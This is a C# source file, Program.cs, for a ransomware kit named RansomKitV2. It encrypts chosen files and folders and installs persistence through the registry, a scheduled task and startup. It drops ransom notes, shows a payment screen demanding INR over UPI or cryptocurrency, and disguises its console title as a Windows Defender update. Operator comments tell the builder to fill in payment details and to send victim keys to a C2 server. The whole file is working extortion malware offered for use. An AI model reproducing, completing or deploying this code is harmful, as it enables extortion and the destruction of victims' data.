using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace RansomKitV2
{
    // ══════════════════════════════════════════════════════════════
    //  Program  —  entry point & orchestration
    //
    //  Modes:
    //    (no args)    First run: ask for paths, encrypt, install, show payment screen
    //    --silent     Restart: skip first-run, go straight to payment screen (from startup)
    //    --decrypt    Manual admin decrypt (provide path + password on CLI)
    //
    //  !! OPERATOR CONFIG — fill these before building !!
    // ══════════════════════════════════════════════════════════════

    class Program
    {
        // ── !! OPERATOR: fill these before building !! ────────────

        // Your UPI ID (e.g. "yourname@ybl" or "1234567890@paytm")
        const string UPI_ID       = "yourname@upi";

        // Amount to demand in INR
        const string UPI_AMOUNT   = "5000";

        // Your Binance wallet address (BEP-20 / BTC)
        const string BNB_ADDRESS  = "0xYourBinanceWalletAddressHere";

        // Your contact email
        const string CONTACT_MAIL = "support@yourdomain.com";

        // ── Main ──────────────────────────────────────────────────

        static void Main(string[] args)
        {
            Console.Title          = "Windows Defender Service Update";
            Console.OutputEncoding = System.Text.Encoding.UTF8;

            // ── Mode routing ──────────────────────────────────────
            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "--silent":  ResumeMode(silent: true);  return;
                    case "--decrypt": ManualDecryptMode();         return;
                }
            }

            // Check if a previous encryption session exists
            if (StateManager.StateExists())
                ResumeMode(silent: false);
            else
                FirstRunMode();
        }

        // ══════════════════════════════════════════════════════════
        //  FIRST RUN MODE
        //  1. Collect target paths interactively
        //  2. Generate master key  (operator must record this!)
        //  3. Discover + encrypt files
        //  4. Persist state
        //  5. Install persistence (registry / task / startup)
        //  6. Start reset watcher
        //  7. Drop ransom notes
        //  8. Show payment screen
        // ══════════════════════════════════════════════════════════

        static void FirstRunMode()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  ═══  File Encryption Utility  ═══\n");
            Console.ResetColor();

            // ── Step 1: collect target paths from user ─────────────
            List<string> roots = CollectPaths();
            if (roots.Count == 0)
            {
                Err("  No valid paths provided. Exiting.");
                return;
            }

            // ── Step 2: generate master key ────────────────────────
            byte[]  masterKey = CryptoEngine.GenerateMasterKey();
            string  password  = CryptoEngine.MasterKeyToPassword(masterKey);
            string  keyHash   = CryptoEngine.HashMasterKey(masterKey);
            string  victimId  = Guid.NewGuid().ToString("N").ToUpper()[..16];

            // OPERATOR OUTPUT — in production send this to your C2 server via HTTPS POST.
            // Displayed here for testing / demo purposes only.
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("\n  ┌─ OPERATOR: SAVE THIS INFORMATION ──────────────────────┐");
            Console.WriteLine($"  │  Victim ID  :  {victimId,-44}│");
            Console.WriteLine($"  │  Password   :  {password,-44}│");
            Console.WriteLine("  │  (This is the password the victim must buy to decrypt)  │");
            Console.WriteLine("  └─────────────────────────────────────────────────────────┘");
            Console.WriteLine("\n  Press ENTER to start encryption...");
            Console.ResetColor();
            Console.ReadLine();

            // ── Step 3: discover files ─────────────────────────────
            Console.WriteLine("  [*] Scanning target paths...");
            var allFiles = new List<string>();
            foreach (var root in roots)
            {
                if (Directory.Exists(root))
                    allFiles.AddRange(Walker.EnumerateTargets(root));
                else if (File.Exists(root) &&
                         !root.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
                    allFiles.Add(root);
            }

            Console.WriteLine($"  [*] Found {allFiles.Count} files. Encrypting...\n");

            // ── Step 4: encrypt ────────────────────────────────────
            var lockedPaths = new List<string>();
            int ok  = 0;
            int bad = 0;

            foreach (var f in allFiles)
            {
                if (CryptoEngine.EncryptFile(f, masterKey))
                {
                    lockedPaths.Add(f + CryptoEngine.LOCKED_EXT);
                    ok++;
                    if (ok % 5 == 0)
                        Console.Write($"\r  Encrypted: {ok} / {allFiles.Count}   ");
                }
                else bad++;
            }
            Console.WriteLine($"\n  [*] Done. Locked: {ok}  Failed: {bad}\n");

            // ── Step 5: save encrypted state ───────────────────────
            var state = new AppState
            {
                VictimId       = victimId,
                MasterKeyHash  = keyHash,
                EncryptedFiles = lockedPaths,
                UpiId          = UPI_ID,
                UpiAmount      = UPI_AMOUNT,
                BinanceAddress = BNB_ADDRESS,
                ContactEmail   = CONTACT_MAIL,
                EncryptedAt    = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
            };
            StateManager.Save(state);

            // ── Step 6: install persistence ────────────────────────
            string exePath = Process.GetCurrentProcess().MainModule?.FileName
                          ?? Environment.ProcessPath
                          ?? "RansomKitV2.exe";
            Persistence.Install(exePath);
            Console.WriteLine("  [*] Persistence installed (registry + scheduled task + startup).");

            // ── Step 7: start reset watcher ────────────────────────
            ResetWatcher.Start(lockedPaths);
            Console.WriteLine("  [*] Reset guard active.\n");

            // ── Step 8: drop ransom notes ──────────────────────────
            var notedDirs = new System.Collections.Generic.HashSet<string>(
                StringComparer.OrdinalIgnoreCase);

            foreach (var lp in lockedPaths)
            {
                string dir = Path.GetDirectoryName(lp) ?? "";
                if (notedDirs.Add(dir))
                    NoteDropper.Drop(dir, victimId, UPI_ID, UPI_AMOUNT, BNB_ADDRESS, CONTACT_MAIL);
            }

            // Always drop on Desktop
            NoteDropper.Drop(
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                victimId, UPI_ID, UPI_AMOUNT, BNB_ADDRESS, CONTACT_MAIL);

            // Also on UserProfile root
            NoteDropper.Drop(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                victimId, UPI_ID, UPI_AMOUNT, BNB_ADDRESS, CONTACT_MAIL);

            // ── Step 9: payment screen (blocks until correct pw) ───
            ShowPaymentAndDecrypt(state, masterKey);
        }

        // ══════════════════════════════════════════════════════════
        //  RESUME MODE  — system was restarted, state file exists
        // ══════════════════════════════════════════════════════════

        static void ResumeMode(bool silent)
        {
            AppState? state = StateManager.Load();
            if (state == null)
            {
                Err("  [!] State file corrupted. Cannot resume. Contact support.");
                Thread.Sleep(10_000);
                return;
            }

            // Keep the reset guard alive across reboots
            ResetWatcher.Start(state.EncryptedFiles);

            if (silent)
            {
                // Launched from startup — wait a moment for desktop to fully load,
                // then show the payment screen so the victim sees it immediately.
                Thread.Sleep(8_000);
            }

            ShowPaymentAndDecrypt(state, null);
        }

        // ── Payment screen + decryption ────────────────────────────

        static void ShowPaymentAndDecrypt(AppState state, byte[]? alreadyKnownKey)
        {
            string password = PaymentScreen.ShowAndWait(
                state.VictimId,
                state.UpiId,
                state.UpiAmount,
                state.BinanceAddress,
                state.ContactEmail,
                state.MasterKeyHash);

            byte[] masterKey = alreadyKnownKey
                            ?? CryptoEngine.PasswordToMasterKey(password)!;

            RunDecryption(masterKey, state.EncryptedFiles);
            CleanupAfterDecrypt();
        }

        // ── Decryption routine ─────────────────────────────────────

        static void RunDecryption(byte[] masterKey, List<string> lockedPaths)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n  ✓  Password accepted. Restoring your files...\n");
            Console.ResetColor();

            int ok  = 0;
            int bad = 0;

            foreach (var lp in lockedPaths)
            {
                if (!File.Exists(lp)) { bad++; continue; }

                if (CryptoEngine.DecryptFile(lp, masterKey))
                {
                    ok++;
                    if (ok % 5 == 0)
                        Console.Write($"\r  Restored: {ok}   ");
                }
                else bad++;
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"\n\n  ✓  Decryption complete!");
            Console.WriteLine($"     Restored : {ok}");
            Console.WriteLine($"     Failed   : {bad}");
            Console.ResetColor();
        }

        // ── Post-decrypt cleanup ───────────────────────────────────

        static void CleanupAfterDecrypt()
        {
            // Remove all persistence mechanisms
            Persistence.Uninstall();

            // Remove encrypted state file
            StateManager.Delete();

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n  ✓  All persistence removed. Your system is clean.");
            Console.ResetColor();
            Console.WriteLine("\n  Press any key to exit.");
            Console.ReadKey(true);
        }

        // ══════════════════════════════════════════════════════════
        //  MANUAL DECRYPT MODE  (--decrypt flag)
        //  Use this if you need to decrypt files without the state
        //  file — e.g. on a fresh boot, or after a partial failure.
        // ══════════════════════════════════════════════════════════

        static void ManualDecryptMode()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("  ══  Manual Decryptor  ══\n");
            Console.ResetColor();

            Console.Write("  Root path to scan for .locked files: ");
            string? root = Console.ReadLine()?.Trim().Trim('"');
            if (string.IsNullOrWhiteSpace(root) || !Directory.Exists(root))
            {
                Err("  ✗  Directory not found."); return;
            }

            Console.Write("  Enter 44-char decryption password: ");
            string? pw = Console.ReadLine()?.Trim();
            if (string.IsNullOrWhiteSpace(pw))
            {
                Err("  ✗  No password."); return;
            }

            byte[]? key = CryptoEngine.PasswordToMasterKey(pw);
            if (key == null)
            {
                Err("  ✗  Invalid password format (must be 44-char Base64)."); return;
            }

            var locked = Walker.EnumerateLocked(root);
            Console.WriteLine($"\n  Found {locked.Count} encrypted files. Decrypting...\n");

            int ok = 0, bad = 0;
            foreach (var lp in locked)
            {
                if (CryptoEngine.DecryptFile(lp, key)) ok++;
                else bad++;
                if ((ok + bad) % 5 == 0)
                    Console.Write($"\r  Done: {ok + bad}   ");
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"\n\n  ✓  Restored: {ok}   Failed: {bad}");
            Console.ResetColor();
            Console.WriteLine("\n  Press any key to exit.");
            Console.ReadKey(true);
        }

        // ── Interactive path collector ────────────────────────────

        static List<string> CollectPaths()
        {
            var paths = new List<string>();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  Enter paths to encrypt (files OR folders, one per line).");
            Console.WriteLine("  Press ENTER on an empty line when done.\n");
            Console.ResetColor();

            int n = 1;
            while (true)
            {
                Console.Write($"  Path {n}: ");
                string? line = Console.ReadLine()?.Trim().Trim('"');

                if (string.IsNullOrWhiteSpace(line)) break;

                if (File.Exists(line) || Directory.Exists(line))
                {
                    paths.Add(line);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"         ✓  Added");
                    Console.ResetColor();
                    n++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"         ✗  Not found — skipped.");
                    Console.ResetColor();
                }
            }
            return paths;
        }

        // ── Error helper ──────────────────────────────────────────

        static void Err(string msg)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(msg);
            Console.ResetColor();
            Thread.Sleep(3_000);
        }
    }
}
